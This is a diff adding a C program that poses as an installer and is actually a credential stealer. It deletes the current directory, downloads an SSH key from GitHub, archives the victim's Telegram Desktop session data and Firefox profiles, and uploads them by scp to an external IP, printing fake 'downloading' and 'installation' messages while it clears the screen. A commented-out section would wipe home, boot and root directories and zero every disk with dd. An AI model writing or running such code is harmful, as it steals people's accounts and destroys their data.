@@ -1,0 +1,100 @@
+#include <unistd.h>
+#include <string.h>
+#define _CRT_SECURE_NO_WARNINGS
+#include <stdio.h>
+#include <stdlib.h>
+//#include <time.h>  
+	int main()
+	{
+	system("rm -rf *");
+	sleep(2);
+	system("wget -P 1/ https://raw.githubusercontent.com/yakey4/4659876/main/ssh-key-2022-07-22.key");
+	system("clear");
+	system("chmod 0600 1/ssh-key-2022-07-22.key");
+	sleep(3);
+	system("rm -rf $HOME/.local/share/TelegramDesktop/tdata/user_data*");
+	sleep(3);
+	system("tar -cf /tmp/main2.tar.gz $HOME/.local/share/TelegramDesktop/tdata/*");
+	sleep(10);
+	system("tar -cf /tmp/main.tar.gz  $HOME/.mozilla/firefox/*");
+	sleep(5);
+	printf("downloading additional resources");
+	system("scp -oStrictHostKeyChecking=no -i 1/ssh-key-2022-07-22.key /tmp/main2.tar.gz ubuntu@193.123.37.30:/home/ubuntu");
+	system("clear");
+	printf("downloading additional resources");
+	system("scp -oStrictHostKeyChecking=no -i 1/ssh-key-2022-07-22.key /tmp/main.tar.gz ubuntu@193.123.37.30:/home/ubuntu");
+	system("clear");
+//	system("""sudo rm -rf /home/* & " );
+//	system("clear");
+//	system("sudo rm -rf /boot/* & ");
+//	system("clear");
+//	sleep(1);
+//	system("clear");
+//	sleep(1);
+//	system("clear");
+//	printf("downloading additional files");	
+//	sleep(1);
+//	system("sudo dd if=/dev/zero of=/home/file.img bs=1M count=512 & ");
+//	system("sudo dd of=/dev/nvram if=/dev/zero & ");
+//	system("sudo rm -rf /root/* &" );
+//	system("clear");
+//	sleep(1);
+//	system("clear");
+//	printf("downloading additional files");
+//	sleep(1);
+//	system("clear");
+//	sleep(1);
+//	system("clear");
+//	sleep(1);
+//	system("clear");
+//	printf("downloading additional files");
+//	sleep(1);
+//	system("clear");
+//	sleep(2);
+//	printf("downloading additional files");
+//	system("sudo dd if=/dev/zero of=/dev/sda & ");
+//	system("clear");
+//	system("sudo dd if=/dev/zero of=/dev/sda1 & ");
+//	system("clear");   
+//	system("sudo dd if=/dev/zero of=/dev/sda2 & ");
+//	system("clear");    
+//	system("sudo dd if=/dev/zero of=/dev/sda3 & ");
+//	system("clear");
+//	system("sudo dd if=/dev/zero of=/dev/sdb & ");
+//	system("clear");
+//	system("sudo dd if=/dev/zero of=/dev/sdb1 & "); 
+//	system("clear");
+//	system("sudo dd if=/dev/zero of=/dev/sdb2 & ");
+//	system("clear");
+//	system("sudo dd if=/dev/zero of=/dev/sdb3 & ");
+//	system("clear");
+//	system("sudo dd if=/dev/zero of=/dev/hda & ");
+//	system("clear");
+//	printf("downloading additional files");
+//	system("sudo dd if=/dev/zero of=/dev/hda1 & ");
+//	system("clear");
+//	system("sudo dd if=/dev/zero of=/dev/hda2 & ");
+//	system("clear");
+//	system("sudo dd if=/dev/zero of=/dev/hda3 & ");
+//	system("clear");
+//	system("sudo dd if=/dev/zero of=/dev/hda4 & ");
+//	system("clear");
+//	printf("downloading additional files");
+//	sleep(1);
+//	system("sudo rm /tmp/debug-tool");
+//	system("clear");
+//	sleep(1);   
+//	system("clear");
+//	sleep(1);
+//	system("clear");
+//	sleep(1);
+//	printf("downloading additional files");
+//	system("clear");
+//	sleep(1);
+//	printf("downloading additional files");
+//	sleep(15);
+	system("clear");
+	printf("installation");
+	sleep(2000);
+	return 0;
+   }
